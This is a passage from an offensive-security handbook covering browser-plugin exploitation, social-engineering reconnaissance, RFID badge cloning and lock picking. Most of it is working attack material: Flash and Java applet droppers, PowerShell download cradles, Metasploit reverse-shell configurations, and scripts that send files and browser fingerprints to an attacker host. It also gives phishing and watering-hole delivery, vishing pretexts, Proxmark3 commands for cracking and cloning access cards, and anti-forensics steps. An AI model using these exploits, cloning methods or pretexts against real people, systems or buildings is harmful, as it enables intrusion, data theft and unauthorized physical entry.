set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
exploit
```

**Manual Flash Exploit Development**

```actionscript
// Malicious.as (ActionScript 3)
package {
    import flash.display.Sprite;
    import flash.external.ExternalInterface;
    import flash.net.URLLoader;
    import flash.net.URLRequest;
    
    public class Malicious extends Sprite {
        public function Malicious() {
            // Call JavaScript to download payload
            if (ExternalInterface.available) {
                ExternalInterface.call("eval", 
                    "var x=new ActiveXObject('Microsoft.XMLHTTP');" +
                    "x.open('GET','http://10.10.10.10/payload.exe',false);" +
                    "x.send();" +
                    "var s=new ActiveXObject('ADODB.Stream');" +
                    "s.type=1;s.open();s.write(x.responseBody);" +
                    "s.saveToFile('C:\\\\Users\\\\Public\\\\payload.exe',2);" +
                    "var r=new ActiveXObject('WScript.Shell').Run('C:\\\\Users\\\\Public\\\\payload.exe');"
                );
            }
        }
    }
}
```

```bash
# Compile ActionScript to SWF
# Requires Apache Flex SDK
mxmlc Malicious.as -output malicious.swf

# Or use swfmill for simple SWF creation
swfmill simple malicious.xml malicious.swf
```

```html
<!-- Embed Flash in HTML -->
<!DOCTYPE html>
<html>
<head>
    <title>Flash Content</title>
</head>
<body>
    <object width="1" height="1">
        <param name="movie" value="malicious.swf">
        <embed src="malicious.swf" width="1" height="1"></embed>
    </object>
</body>
</html>
```

**Flash-Based Cross-Site Scripting (XSS)**

```actionscript
// XSS via navigateToURL
package {
    import flash.display.Sprite;
    import flash.net.navigateToURL;
    import flash.net.URLRequest;
    
    public class FlashXSS extends Sprite {
        public function FlashXSS() {
            var payload:String = root.loaderInfo.parameters.callback;
            navigateToURL(new URLRequest("javascript:" + payload), "_self");
        }
    }
}
```

```html
<!-- Exploit via URL parameter -->
<embed src="flashxss.swf?callback=alert(document.cookie)" width="1" height="1">
```

**Flash Local Shared Objects (LSO) Manipulation**

```actionscript
// Store malicious data in Flash cookies
package {
    import flash.display.Sprite;
    import flash.net.SharedObject;
    
    public class LSOExploit extends Sprite {
        public function LSOExploit() {
            var so:SharedObject = SharedObject.getLocal("malicious");
            so.data.payload = "malicious_code_here";
            so.flush();
        }
    }
}
```

**CVE-2015-5119 (Hacking Team Flash Exploit)**

```bash
# Using Metasploit module
use exploit/multi/browser/adobe_flash_hacking_team_uaf
set SRVHOST 0.0.0.0
set SRVPORT 8080
set URIPATH /video
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
exploit

# Victims visiting http://10.10.10.10:8080/video will be exploited
```

**Flash Player Detection and Fingerprinting**

```javascript
// Detect Flash Player version
function getFlashVersion() {
    var flashVersion = "Not installed";
    try {
        var flash = new ActiveXObject("ShockwaveFlash.ShockwaveFlash");
        flashVersion = flash.GetVariable("$version");
    } catch (e) {
        if (navigator.plugins && navigator.plugins.length > 0) {
            var flash = navigator.plugins["Shockwave Flash"];
            if (flash) {
                flashVersion = navigator.plugins["Shockwave Flash"].description;
            }
        }
    }
    
    // Send to attacker
    fetch('http://10.10.10.10/flash-version?v=' + encodeURIComponent(flashVersion));
    return flashVersion;
}

getFlashVersion();
```

**Silverlight Exploitation**

[Unverified] Microsoft Silverlight is also deprecated but may exist in legacy environments.

```bash
# Metasploit Silverlight exploit
use exploit/multi/browser/silverlight_invalid_html_object
set SRVHOST 0.0.0.0
set SRVPORT 8080
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
exploit
```

**ActiveX Control Exploitation**

```html
<!-- Exploit vulnerable ActiveX control -->
<object classid="clsid:VULNERABLE-CLSID-HERE" id="vuln">
    <param name="Property" value="malicious_value">
</object>

<script>
// Trigger vulnerability
vuln.VulnerableMethod();
</script>

<!-- WMI ActiveX exploitation -->
<object id="wmi" classid="clsid:76A64158-CB41-11D1-8B02-00600806D9B6"></object>
<script>
var service = wmi.Get("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
var process = service.Get("Win32_Process");
process.Create("cmd.exe /c powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/p.ps1')");
</script>
```

**PDF Reader Plugin Exploitation**

```bash
# Adobe PDF Reader JavaScript exploitation
use exploit/windows/browser/adobe_utilprintf
set SRVHOST 0.0.0.0
set SRVPORT 8080
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
exploit

# PDF with embedded JavaScript
use auxiliary/fileformat/adobe_pdf_embedded_exe
set INFILENAME template.pdf
set FILENAME malicious.pdf
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
run
```

**QuickTime Plugin Exploitation**

```bash
# QuickTime RTSP response header overflow
use exploit/windows/browser/quicktime_rtsp_content_type
set SRVHOST 0.0.0.0
set SRVPORT 8080
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
exploit
```

**VLC Media Player Plugin Exploitation**

```bash
# VLC AMV file parsing vulnerability
use exploit/windows/browser/vlc_amv
set SRVHOST 0.0.0.0
set SRVPORT 8080
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
exploit

# VLC XSPF playlist format string vulnerability
use exploit/windows/browser/vlc_xspf
set SRVHOST 0.0.0.0
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
exploit
```

**Java WebStart (JNLP) Exploitation**

```xml
<!-- malicious.jnlp -->
<?xml version="1.0" encoding="utf-8"?>
<jnlp spec="1.0+" codebase="http://10.10.10.10/" href="malicious.jnlp">
    <information>
        <title>Legitimate Application</title>
        <vendor>Trusted Vendor</vendor>
        <description>Important Business Application</description>
    </information>
    <security>
        <all-permissions/>
    </security>
    <resources>
        <j2se version="1.6+"/>
        <jar href="malicious.jar" main="true"/>
    </resources>
    <application-desc main-class="MaliciousApplet"/>
</jnlp>
```

```bash
# Host JNLP file and JAR
python3 -m http.server 8080

# Link to JNLP triggers Java WebStart
# http://10.10.10.10:8080/malicious.jnlp
```

**Plugin Detection and Fingerprinting**

```javascript
// Comprehensive plugin detection
function detectPlugins() {
    var plugins = {
        flash: false,
        java: false,
        silverlight: false,
        pdf: false,
        quicktime: false,
        vlc: false
    };
    
    // Check for Flash
    try {
        plugins.flash = Boolean(new ActiveXObject('ShockwaveFlash.ShockwaveFlash'));
    } catch(e) {
        if (navigator.plugins['Shockwave Flash']) {
            plugins.flash = true;
        }
    }
    
    // Check for Java
    if (navigator.javaEnabled && navigator.javaEnabled()) {
        plugins.java = true;
    }
    
    // Check for Silverlight
    try {
        plugins.silverlight = Boolean(new ActiveXObject('AgControl.AgControl'));
    } catch(e) {
        if (navigator.plugins['Silverlight Plug-In']) {
            plugins.silverlight = true;
        }
    }
    
    // Check for PDF
    if (navigator.plugins['Adobe Acrobat'] || navigator.plugins['Chrome PDF Viewer']) {
        plugins.pdf = true;
    }
    
    // Check for QuickTime
    if (navigator.plugins['QuickTime Plug-in']) {
        plugins.quicktime = true;
    }
    
    // Check for VLC
    if (navigator.plugins['VLC media player']) {
        plugins.vlc = true;
    }
    
    // Exfiltrate to attacker
    fetch('http://10.10.10.10/plugins', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(plugins)
    });
    
    return plugins;
}

detectPlugins();
```

**PluginDetect Library Usage**

```html
<script src="http://10.10.10.10/PluginDetect.js"></script>
<script>
var plugins = {
    flash: PluginDetect.getVersion('Flash'),
    java: PluginDetect.getVersion('Java'),
    pdf: PluginDetect.getVersion('AdobeReader'),
    silverlight: PluginDetect.getVersion('Silverlight'),
    quicktime: PluginDetect.getVersion('QuickTime')
};

// Send to attacker
fetch('http://10.10.10.10/plugin-info', {
    method: 'POST',
    body: JSON.stringify(plugins)
});
</script>
```

**Targeted Plugin Exploitation Flow**

```bash
# 1. Setup fingerprinting server
cat > fingerprint.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<script>
function detectAndRedirect() {
    var flash = false;
    var java = false;
    
    try {
        flash = Boolean(new ActiveXObject('ShockwaveFlash.ShockwaveFlash'));
    } catch(e) {
        if (navigator.plugins['Shockwave Flash']) flash = true;
    }
    
    if (navigator.javaEnabled && navigator.javaEnabled()) java = true;
    
    // Redirect to appropriate exploit
    if (flash) {
        window.location = 'http://10.10.10.10:8080/flash';
    } else if (java) {
        window.location = 'http://10.10.10.10:8080/java';
    } else {
        window.location = 'http://10.10.10.10:8080/generic';
    }
}
detectAndRedirect();
</script>
</body>
</html>
EOF

# 2. Setup Metasploit handlers for each plugin type
msfconsole -q -r exploit_setup.rc
```

```bash
# exploit_setup.rc
use exploit/multi/browser/adobe_flash_hacking_team_uaf
set SRVHOST 0.0.0.0
set SRVPORT 8080
set URIPATH /flash
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
exploit -j

use exploit/multi/browser/java_jre17_jaxws
set SRVHOST 0.0.0.0
set SRVPORT 8080
set URIPATH /java
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4445
exploit -j

use auxiliary/server/browser_autopwn2
set SRVHOST 0.0.0.0
set SRVPORT 8080
set URIPATH /generic
exploit -j
```

**Java Applet Security Bypass Techniques**

```java
// Bypass Java security manager
import java.security.*;

public class SecurityBypass extends Applet {
    public void init() {
        try {
            // Attempt to disable security manager
            System.setSecurityManager(null);
            
            // Execute system command
            Runtime.getRuntime().exec("cmd.exe /c powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/p.ps1')");
        } catch (Exception e) {
            // Fallback to reflection-based bypass
            try {
                Class<?> c = Class.forName("sun.misc.Unsafe");
                Field f = c.getDeclaredField("theUnsafe");
                f.setAccessible(true);
                Object unsafe = f.get(null);
                // Use Unsafe to bypass restrictions
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }
}
```

**Flash Cross-Domain Policy Exploitation**

```xml
<!-- Overly permissive crossdomain.xml on target server -->
<?xml version="1.0"?>
<cross-domain-policy>
    <allow-access-from domain="*" />
</cross-domain-policy>
```

```actionscript
// Exploit permissive policy from attacker's Flash
package {
    import flash.display.Sprite;
    import flash.net.URLLoader;
    import flash.net.URLRequest;
    import flash.events.*;
    
    public class CrossDomainExploit extends Sprite {
        public function CrossDomainExploit() {
            var loader:URLLoader = new URLLoader();
            loader.addEventListener(Event.COMPLETE, onComplete);
            loader.load(new URLRequest("http://victim-site.com/api/sensitive-data"));
        }
        
        private function onComplete(event:Event):void {
            var loader:URLLoader = URLLoader(event.target);
            // Exfiltrate data to attacker
            var exfil:URLLoader = new URLLoader();
            exfil.load(new URLRequest("http://10.10.10.10/exfil?data=" + escape(loader.data)));
        }
    }
}
```

**Defensive Bypass - Click-Jacking for Plugin Execution**

```html
<!-- Overlay legitimate content to trick user into clicking malicious plugin -->
<!DOCTYPE html>
<html>
<head>
    <style>
        iframe {
            width: 500px;
            height: 400px;
            position: absolute;
            top: 0;
            left: 0;
            opacity: 0.1; /* Nearly invisible */
            z-index: 2;
        }
        .decoy {
            width: 500px;
            height: 400px;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div class="decoy">
        <h1>Click Here to Win $1000!</h1>
        <button>CLAIM PRIZE</button>
    </div>
    <iframe src="http://10.10.10.10:8080/java"></iframe>
</body>
</html>
```

**Exploitation Chaining - Plugin to System Compromise**

```bash
# 1. Exploit Java applet for initial foothold
# 2. Use gained access to download secondary payload
# 3. Escalate privileges via local exploit

# Initial Java applet downloads dropper
# MaliciousApplet.java
import java.applet.Applet;
import java.net.*;
import java.io.*;

public class MaliciousApplet extends Applet {
    public void init() {
        try {
            // Download stage 2 payload
            URL url = new URL("http://10.10.10.10/stage2.exe");
            URLConnection conn = url.openConnection();
            InputStream in = conn.getInputStream();
            FileOutputStream out = new FileOutputStream("C:\\Users\\Public\\stage2.exe");
            
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = in.read(buffer)) != -1) {
                out.write(buffer, 0, bytesRead);
            }
            
            out.close();
            in.close();
            
            // Execute stage 2
            Runtime.getRuntime().exec("C:\\Users\\Public\\stage2.exe");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

**Plugin Exploit Delivery Methods**

```bash
# Email phishing with plugin exploit
cat > phishing_email.html << 'EOF'
<html>
<body>
<h2>Important: Security Update Required</h2>
<p>Your Java plugin requires an immediate security update.</p>
<p><a href="http://10.10.10.10/update.jnlp">Click here to update</a></p>
</body>
</html>
EOF

# Malvertising - Inject into ad network
# Setup exploit server, purchase ad placement
# Serve exploit to visitors via ads

# Watering hole - Compromise frequently visited site
# Inject plugin exploit into legitimate site
<script>
if (navigator.plugins['Shockwave Flash']) {
    var div = document.createElement('div');
    div.innerHTML = '<embed src="http://10.10.10.10/flash-exploit.swf" width="1" height="1">';
    document.body.appendChild(div);
}
</script>

# SEO poisoning - Rank exploit page for popular search terms
# Create pages optimized for vulnerable plugin searches
# Serve exploits to visitors from search engines
```

**Testing Plugin Vulnerabilities**

```bash
# Nessus plugin scanning
nessus --scan-plugins browser

# Nikto browser checks
nikto -h http://target.com -Tuning 9

# Manual version checking
curl -s http://target.com | grep -i "flash\|java\|silverlight"

# Browser exploitation framework selection based on detected plugins
```

**Post-Exploitation via Plugins**

```java
// Java applet for file system access
import java.applet.Applet;
import java.io.*;

public class FileExfil extends Applet {
    public void init() {
        try {
            // Read sensitive files
            File file = new File("C:\\Users\\victim\\Documents\\passwords.txt");
            FileInputStream fis = new FileInputStream(file);
            byte[] data = new byte[(int) file.length()];
            fis.read(data);
            fis.close();
            
            // Exfiltrate via HTTP
            String encoded = java.util.Base64.getEncoder().encodeToString(data);
            URL url = new URL("http://10.10.10.10/exfil?data=" + encoded);
            url.openConnection().getInputStream();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

**Persistence via Plugin Exploitation**

```actionscript
// Flash LSO (Local Shared Object) persistence
package {
    import flash.display.Sprite;
    import flash.net.SharedObject;
    import flash.utils.setInterval;
    
    public class Persistence extends Sprite {
        public function Persistence() {
            // Store payload in LSO
            var so:SharedObject = SharedObject.getLocal("update");
            so.data.payload = "http://10.10.10.10/beacon.php";
            so.flush();
            
            // Beacon every 5 minutes
            setInterval(beacon, 300000);
        }
        
        private function beacon():void {
            navigateToURL(new URLRequest(SharedObject.getLocal("update").data.payload));
        }
    }
}
```

---

**Critical Notes on Plugin Exploitation:**

- **Flash and Java browser plugins are deprecated** and disabled by default in modern browsers (Chrome, Firefox, Edge post-2020)
- **Legacy environments, intranets, and specific industries** (healthcare, government, manufacturing) may still use these technologies
- **CTF scenarios frequently include plugin vulnerabilities** to test historical exploitation knowledge
- **Always fingerprint target environment** before deploying plugin exploits to avoid detection
- [Unverified] **Success rates vary significantly** based on target browser version, OS, and security posture

**Related Important Topics for Further Study:**

- **Browser Exploit Development**: Writing custom browser exploits from scratch
- **Client-Side Prototype Pollution**: Modern JavaScript exploitation techniques
- **WebAssembly Exploitation**: Emerging attack surface in modern browsers
- **Electron Application Security**: Attacking desktop apps built with web technologies
- **Browser Extension Security**: Malicious extension development and deployment
- **Same-Origin Policy Bypasses**: Advanced cross-domain exploitation techniques

---

## Physical Security

### Social Engineering Reconnaissance

Social engineering reconnaissance involves gathering information about physical security controls, personnel, procedures, and organizational structure before attempting physical access. This phase is critical for identifying weaknesses and planning effective entry strategies.

**Pre-Engagement Information Gathering**

**Open Source Intelligence (OSINT) Collection**

```bash
# Domain and subdomain enumeration for facility information
amass enum -d target-company.com -o domains.txt

# Extract employee information from LinkedIn
# Use tools like linkedin2username
python3 linkedin2username.py -c "Target Company" -n 100

# Google dorking for facility information
site:target-company.com "office location"
site:target-company.com "badge" OR "access card"
site:target-company.com filetype:pdf "floor plan"

# Search for organizational charts
site:target-company.com "organizational chart" OR "org chart"
```

**Physical Reconnaissance Techniques**

**Perimeter Observation**

- **Peak hours analysis**: Document employee arrival/departure times (typically 8-9 AM, 5-6 PM)
- **Delivery schedules**: Note when vendors arrive (food delivery, mail, cleaning services)
- **Smoking areas**: Observe badge usage patterns and tailgating opportunities
- **Parking lot surveys**: Identify executive parking, visitor areas, and vehicle access controls
- **Camera placement**: Map security camera locations, blind spots, and coverage angles

**Documentation Methods**

```bash
# Geotagged photo organization
exiftool -GPS* -n reconnaissance_photos/

# Create facility map with annotations
# Tools: Google Earth, Maltego for visualization
# Document: entry points, camera locations, guard positions, badge readers
```

**Employee Pattern Analysis**

- **Dress code observation**: Determine appropriate attire for blending
- **Badge display methods**: Identify if badges are worn visibly, on lanyards, or retracted
- **Security awareness**: Observe if employees challenge strangers or hold doors
- **Break room patterns**: Note social gathering areas for pretexting opportunities

**Telephone Reconnaissance (Vishing)**

```
# Information gathering call script template

"Hi, this is [name] from [IT/Facilities/HR]. I'm updating our 
[system/records/database] and need to verify some information..."

Target information:
- Badge system vendor/model
- Access control software
- Security guard schedule
- Visitor management process
- IT helpdesk procedures
- Physical security contact
```

**[Inference] Common pretexts:**

- IT support verifying badge system
- Facilities coordinator scheduling maintenance
- HR representative confirming employee records
- Vendor scheduling delivery
- Fire marshal conducting inspection

**Dumpster Diving**

[Unverified] Legal considerations vary by jurisdiction. In many locations, trash on public property is not legally protected, but always verify local laws.

**Target materials:**

- Expired access badges or RFID cards
- Organizational charts and employee directories
- Facility maps and floor plans
- Password sticky notes and credential information
- Shipping labels with internal contact information
- IT disposal records showing equipment/software details

**Best practices:**

```bash
# Document findings systematically
mkdir -p recon/{documents,badges,technical,personnel}

# Photograph items in situ before removal
# Create chain of custody documentation
# Sanitize personal information in reports
```

**Social Media Intelligence**

**Platform-specific reconnaissance:**

```bash
# LinkedIn enumeration
# Target: Current employees, job postings, company updates
# Look for: Badge photos, office interior shots, security role postings

# Instagram/Facebook
# Search hashtags: #[companyname]office #[companyname]team
# Identify: Badge visibility, interior layouts, security features

# Twitter/X
# Monitor: Company announcements, employee complaints about security
# Search: "[company] badge" "[company] access card"

# Glassdoor
# Review: Employee reviews mentioning security procedures
# Identify: Interview processes, visitor management, security culture
```

**Tool-Assisted Social Engineering Reconnaissance**

```bash
# theHarvester - Email and subdomain gathering
theHarvester -d target-company.com -b all -l 500

# Maltego - Relationship mapping
# Create transforms for: employees, facilities, organizational structure

# Recon-ng - Automated OSINT framework
recon-ng
[recon-ng][default] > marketplace install all
[recon-ng][default] > modules load recon/domains-contacts/whois_pocs
[recon-ng][default] > options set SOURCE target-company.com
[recon-ng][default] > run

# SpiderFoot - Automated OSINT collection
spiderfoot -s target-company.com -t all -o json
```

**On-Site Pretexting Scenarios**

**Delivery person pretext:**

- Carry packages or clipboard
- Wear appropriate uniform (FedEx, UPS, food delivery)
- Time arrival during busy periods
- Request employee assistance: "Can you hold the door? My hands are full."

**Maintenance/contractor pretext:**

- Wear high-visibility vest or utility uniform
- Carry tools or equipment (ladder, toolbox)
- Display fake work orders
- Target areas: HVAC access, electrical rooms, network closets

**New employee pretext:**

- Business attire appropriate to company culture
- Carry laptop bag and personal items
- Claim forgotten badge: "It's my first week, still waiting for my badge."
- Target HR or reception areas during onboarding hours (Monday mornings)

**Interviewing candidate pretext:**

- Professional attire
- Carry resume/portfolio
- Schedule reconnaissance during actual interview times
- Claim confusion about location: "I'm here for an interview, which floor?"

**Information Validation and Verification**

Cross-reference collected intelligence:

```bash
# Verify badge system information
# Compare: Job postings (security system administrator roles)
#          Vendor vehicles in parking lot
#          Online procurement records
#          LinkedIn profiles (security personnel)

# Validate organizational structure
# Sources: Annual reports, press releases, LinkedIn hierarchy
#          Conference speaker bios, patent filings

# Confirm physical security measures
# Multiple observations at different times
# Correlation with industry standards for similar facilities
# Verification through pretext calls to different departments
```

**Reconnaissance Documentation Template**

```
FACILITY: [Target Name]
DATE: [Observation Date]
TIME: [Start - End]

PHYSICAL CONTROLS:
- Perimeter: [Fencing, gates, vehicle barriers]
- Entry points: [Main entrance, side doors, loading dock]
- Badge readers: [Locations, models if identifiable]
- Cameras: [Positions, coverage, blind spots]
- Guards: [Number, locations, rotation schedule]
- Mantraps: [Presence, type, usage patterns]

PERSONNEL PATTERNS:
- Peak traffic: [Times and door usage]
- Badge display: [Visible, lanyard, retractable]
- Tailgating: [Common occurrence Y/N]
- Security awareness: [High/Medium/Low based on observations]

VULNERABILITIES IDENTIFIED:
- [List specific weaknesses observed]

RECOMMENDED APPROACH:
- [Optimal pretext and timing]
```

### Badge Cloning

Badge cloning involves duplicating RFID or magnetic stripe access cards to gain unauthorized entry. This technique requires understanding card technologies, reading card data, and writing to blank cards.

**RFID Technology Overview**

**Low Frequency (LF) Cards - 125 kHz**

Common standards:

- **EM4100/EM4102**: Read-only proximity cards (most common)
- **HID Prox**: Proprietary HID format, read-only
- **T5577**: Rewritable chip used in many generic cards
- **Indala**: Used in some corporate environments

Characteristics:

- Short read range (typically 2-4 inches)
- Simple data structure (usually just a facility code and card number)
- No encryption
- Easy to clone

**High Frequency (HF) Cards - 13.56 MHz**

Common standards:

- **MIFARE Classic 1K/4K**: Widely used, cryptographically weak
- **MIFARE DESFire**: More secure, uses 3DES/AES encryption
- **iClass**: HID's encrypted standard
- **MIFARE Ultralight**: Simple, limited memory

Characteristics:

- Longer read range (up to 4 inches)
- More complex data structures
- May include encryption (depending on implementation)
- Some variants difficult to clone

**Hardware Tools**

**Proxmark3 - Professional RFID Research Tool**

```bash
# Proxmark3 installation on Kali Linux
sudo apt update
sudo apt install -y proxmark3

# Alternative: Build from source for latest features
git clone https://github.com/RfidResearchGroup/proxmark3.git
cd proxmark3
make clean && make all
sudo make install

# Connect Proxmark3
proxmark3 /dev/ttyACM0

# Verify connection
[usb] pm3 --> hw version
[usb] pm3 --> hw tune  # Check antenna tuning
```

**ACR122U - Budget NFC Reader/Writer**

```bash
# Install libnfc for ACR122U support
sudo apt install -y libnfc-bin libnfc-dev pcsc-tools

# Check reader detection
nfc-list

# Scan for cards
nfc-poll
```

**Flipper Zero - Portable RFID Tool**

Capabilities:

- Reads 125 kHz and 13.56 MHz cards
- Emulates stored cards
- Portable form factor for covert operations
- Can save multiple cards in memory

**LF (125 kHz) Badge Cloning**

**Reading EM4100/HID Prox Cards**

```bash
# Proxmark3 - Read LF card
[usb] pm3 --> lf search

# Output example:
# EM410x Tag ID: 0F0368A5B1
# Facility Code: 15
# Card Number: 3568

# Save the read
[usb] pm3 --> lf em 410x_read
[usb] pm3 --> lf em 410x_demod
```

**Alternative tools:**

```bash
# Using Proxmark3 standalone mode
# Place Proxmark3 near card, it will store the read

# HydraNFC (for NFC-capable LF cards)
hydrafw> show system
hydrafw> lf tune
hydrafw> lf read
```

**Writing to T5577 Blank Cards**

```bash
# Clone EM4100 to T5577
[usb] pm3 --> lf em 410x_clone --id 0F0368A5B1

# Verify the clone
[usb] pm3 --> lf search

# Clone HID Prox format
[usb] pm3 --> lf hid clone --raw 2006ec0c86

# Alternative: Clone with facility code and card number
[usb] pm3 --> lf hid clone --fc 15 --cn 3568
```

**Flipper Zero LF cloning:**

```
1. Navigate: RFID → Read
2. Place card near Flipper
3. Wait for successful read
4. Select: Save
5. To emulate: RFID → Saved → [Select card] → Emulate
```

**HF (13.56 MHz) Badge Cloning**

**MIFARE Classic Exploitation**

MIFARE Classic cards use weak CRYPTO1 encryption that can be broken.

```bash
# Proxmark3 - Detect card type
[usb] pm3 --> hf search

# Check for known keys
[usb] pm3 --> hf mf chk --1k  # For 1K cards
[usb] pm3 --> hf mf chk --4k  # For 4K cards

# Nested attack (if one key is known)
[usb] pm3 --> hf mf nested --1k --blk 0 --a --key FFFFFFFFFFFF

# Hardnested attack (more powerful)
[usb] pm3 --> hf mf hardnested --blk 0 --a --key FFFFFFFFFFFF --tblk 4 --ta

# Full card dump
[usb] pm3 --> hf mf autopwn

# Save dump to file
[usb] pm3 --> hf mf dump --1k -f victim_card

# Write to blank card (Chinese Magic Card Gen1a/Gen2)
[usb] pm3 --> hf mf cload -f victim_card
```

**MIFARE Classic Key Dictionary Attack**

```bash
# Use comprehensive key dictionary
[usb] pm3 --> hf mf chk --1k -f /usr/share/proxmark3/dictionaries/mfc_default_keys.dic

# Custom key list creation
echo "FFFFFFFFFFFF" > custom_keys.dic
echo "A0A1A2A3A4A5" >> custom_keys.dic
echo "B0B1B2B3B4B5" >> custom_keys.dic

[usb] pm3 --> hf mf chk --1k -f custom_keys.dic
```

**HID iClass Attack**

iClass cards are more secure but still vulnerable:

```bash
# Read iClass card (requires diversified key)
[usb] pm3 --> hf iclass dump --ki 0

# Dictionary attack with known keys
[usb] pm3 --> hf iclass chk -f iclass_default_keys.dic

# Loclass attack (recover master authentication key)
[usb] pm3 --> hf iclass loclass
```

[Unverified] iClass SE (Secure Element) cards use stronger encryption and may resist these attacks. Success depends on implementation and key management practices.

**MIFARE DESFire Cloning**

```bash
# Read DESFire card structure
[usb] pm3 --> hf mfdes info

# List applications
[usb] pm3 --> hf mfdes getappids

# Attempt default key authentication
[usb] pm3 --> hf mfdes auth --aid 000000 --keyno 0 --algo des --key 0000000000000000

# Dump accessible data (requires authentication)
[usb] pm3 --> hf mfdes dump
```

[Inference] DESFire cards with properly configured keys and diversification are significantly harder to clone. Focus on social engineering to obtain credentials or look for implementation vulnerabilities.

**Using ACR122U for Cloning**

```bash
# Read MIFARE Classic with mfoc (MIFARE Classic Offline Cracker)
mfoc -O card_dump.mfd

# Alternative: Use mfcuk (MIFARE Classic Universal toolKit)
mfcuk -C -R 0:A -w known_keys.txt

# Write to card using nfc-mfclassic
nfc-mfclassic w a card_dump.mfd writable_card.mfd

# Read/write with libnfc
nfc-list
nfc-mfclassic r a original_dump.mfd
nfc-mfclassic w a original_dump.mfd blank_card.mfd
```

**Magnetic Stripe Badge Cloning**

Some facilities still use magnetic stripe cards (less common for primary access control).

**Hardware required:**

- MSR605X or similar magnetic stripe reader/writer
- Blank magnetic stripe cards (HiCo or LoCo)

**Linux tools:**

```bash
# Install magnetic stripe tools
sudo apt install -y libmsrtools

# Read card
msrread /dev/ttyUSB0 > card_data.txt

# Write to blank card
msrwrite /dev/ttyUSB0 < card_data.txt
```

**Alternatively, use MSR605X software:**

```bash
# Using msr-tools
sudo pip3 install msr-tools

# Read magnetic stripe
python3 -m msr-tools read /dev/ttyUSB0

# Clone to new card
python3 -m msr-tools write /dev/ttyUSB0 --track1 "DATA1" --track2 "DATA2" --track3 "DATA3"
```

**Long-Range Badge Capture**

[Inference] While standard readers operate at 2-4 inches, specialized equipment can read RFID badges from extended distances.

**Extended range reading setup:**

```bash
# Using Proxmark3 with external antenna
# Build high-gain antenna (LF: loop antenna, HF: larger coil)
# Connect to Proxmark3 external antenna ports

# Increase read power (may violate regulations)
[usb] pm3 --> lf config --divisor 95 --threshold 100 --samples 1000

# Continuous scanning mode
[usb] pm3 --> lf search --continuous
```

**Practical considerations:**

- Legal restrictions on RF power output
- Detection risk from security monitoring
- Environmental interference
- Card orientation sensitivity

**Badge Emulation vs Physical Cloning**

**Emulation advantages:**

- No physical card needed
- Can store multiple credentials
- Rapid credential switching
- Useful for testing and demonstrations

**Proxmark3 emulation:**

```bash
# Emulate LF card
[usb] pm3 --> lf em 410x_sim --id 0F0368A5B1

# Emulate HID Prox
[usb] pm3 --> lf hid sim --raw 2006ec0c86

# Emulate MIFARE Classic
[usb] pm3 --> hf mf sim --1k --uid 04A2B3C4

# Run emulation from dump file
[usb] pm3 --> hf mf eload -f victim_card
[usb] pm3 --> hf mf sim --1k
```

**Flipper Zero emulation:** Simply select a saved card and choose "Emulate" mode.

**Detection Evasion**

**Anti-cloning measures to be aware of:**

- **UID tracking**: System logs unique IDs and flags duplicates
- **Sequential access**: Card must be used at logical locations in sequence
- **Time-based restrictions**: Cards only work during specific hours
- **Photo verification**: Guards compare badge photo to person
- **Anti-passback**: Card cannot be used at exit then entry without leaving first

**Evasion techniques:**

```bash
# Change UID for each access (requires magic card)
[usb] pm3 --> hf mf csetuid --uid 04A2B3C4

# Test card behavior before use
[usb] pm3 --> hf mf sim --1k --uid 04A2B3C4 --atqa 0400 --sak 08

# Monitor for anomalous responses
# Look for extended authentication sequences that might indicate advanced security
```

**Cleanup and Anti-Forensics**

```bash
# Wipe Proxmark3 flash memory
[usb] pm3 --> mem wipe

# Clear bash history after operations
history -c
rm ~/.bash_history

# Securely delete dump files
shred -vfz -n 10 *.mfd *.dmp *.bin

# Clean metadata from documentation
exiftool -all= reconnaissance_notes.pdf
```

### Lock Picking Techniques

Lock picking involves manipulating lock components to open a lock without the original key. This section covers pin tumbler locks (most common), wafer locks, and specialized bypass techniques relevant to physical security assessments.

**Lock Fundamentals**

**Pin Tumbler Lock Anatomy**

Key components:

- **Plug (core)**: Rotating cylinder that turns when correct key is inserted
- **Housing (bible)**: Outer shell containing pin stacks
- **Shear line**: Boundary between plug and housing; pins must align here to rotate
- **Driver pins**: Upper pins pushed by springs
- **Key pins**: Lower pins that contact the key
- **Springs**: Provide tension pushing pins downward

**Operating principle:** Correct key lifts each pin stack so the gap between driver and key pin aligns at the shear line, allowing plug rotation.

**Essential Lock Picking Tools**

**Basic pick set components:**

```
Hook picks:
- Short hook (SSDeV, Peterson Hook 1): Standard manipulation
- Deep hook: Reaches rear pins in long keyways
- Offset hybrid (Southord PXS-14): Versatile for various locks

Rake picks:
- Bogota rake (triple-peak): Fast raking technique
- Snake rake: Scrubbing motion for quick opens
- City rake (C-rake): Aggressive multi-pin contact

Tension tools:
- Top of keyway (TOK): Standard tension application
- Bottom of keyway (BOK): Better control, less keyway obstruction
- Z-bar tensioner: Dual-function TOK/BOK

Specialty tools:
- Half-diamond: Single-pin picking in tight keyways
- Ball pick: Wafer lock manipulation
- Decoder pick: Measure pin heights while picking
```

